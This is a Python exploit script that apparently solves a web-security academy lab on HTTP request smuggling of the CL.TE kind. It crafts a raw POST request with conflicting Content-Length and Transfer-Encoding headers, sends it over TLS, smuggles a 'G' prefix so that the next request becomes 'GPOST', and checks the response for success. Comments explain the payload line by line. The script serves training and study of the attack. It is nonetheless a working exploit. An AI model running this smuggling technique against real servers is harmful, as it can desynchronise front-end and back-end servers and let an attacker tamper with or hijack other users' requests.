import socket
import ssl
import sys
import requests
import urllib3

# Disable SSL warnings for cleaner output
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: HTTP request smuggling, basic CL.TE vulnerability

def CL_TE(target_host, target_port):
    # Construct the malicious payload
    # This payload exploits a CL.TE (Content-Length and Transfer-Encoding) vulnerability.
    # The front-end server uses Content-Length, while the back-end server prioritizes Transfer-Encoding: chunked.
    payload = (
        "POST / HTTP/1.1\r\n"  # Start of the HTTP request
        f"Host: {target_host}\r\n"  # Target host
        "Content-Type: application/x-www-form-urlencoded\r\n"  # Typical POST content type
        "Transfer-Encoding: chunked\r\n"  # Declares chunked transfer to back-end
        "Content-Length: 6\r\n"  # Misleading Content-Length for front-end parsing
        "\r\n"
        "0\r\n"  # Termination of chunked encoding (signals the end of the chunked payload)
        "\r\n"
        "G"  # The smuggled payload (incomplete GPOST request for the back-end server)
    )

    # Establish an SSL context for secure communication
    context_ssl = ssl.create_default_context()
    with socket.create_connection((target_host, target_port)) as sock:
        with context_ssl.wrap_socket(sock, server_hostname=target_host) as securesock:
            print('(+) Sending payload .....')
            # Send the malicious payload to the server
            securesock.sendall(payload.encode())
            # Receive the response from the server
            smugglied_response = securesock.recv(4096)

            # Check if the front-end server responded successfully
            if "HTTP/1.1 200 OK" in smugglied_response.decode():
                print("(+) Payload sent successfully.")
                # Attempt to trigger the smuggled request
                response = requests.post("https://" + target_host, verify=False)
                # Check for the lab-specific behavior indicating success
                if "Unrecognized method GPOST" in response.text:
                    print('(+) Request smuggled successfully.')
                    print('(+) Lab solved successfully.')
                else:
                    print('(-) Error')
            elif "504 Gateway Timeout" in smugglied_response.decode():
                # Handle timeout errors, which may indicate a blocked payload
                print("(-) No response received from the server.")
                sys.exit(1)
            else:
                # Handle unexpected responses
                print('(-) Unexpected Error')

def main():
    # Ensure the correct number of arguments is provided
    if len(sys.argv) != 2:
        print('(+) Usage: %s <url>' % sys.argv[0])
        print('(+) Example: %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net' % sys.argv[0])
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = 443  # Default HTTPS port
    print('(+) Starting .....')
    CL_TE(target_host, target_port)

if __name__ == "__main__":
    main()

# Explanation of the payload:
# - The `Content-Length: 6` tricks the front-end server into reading only the first part of the request.
# - The `Transfer-Encoding: chunked` header is used by the back-end server, which interprets the request differently.
# - The `0\r\n\r\n` ends the chunked encoding.
# - The smuggled "G" is combined with the next request to form "GPOST", triggering the vulnerability.
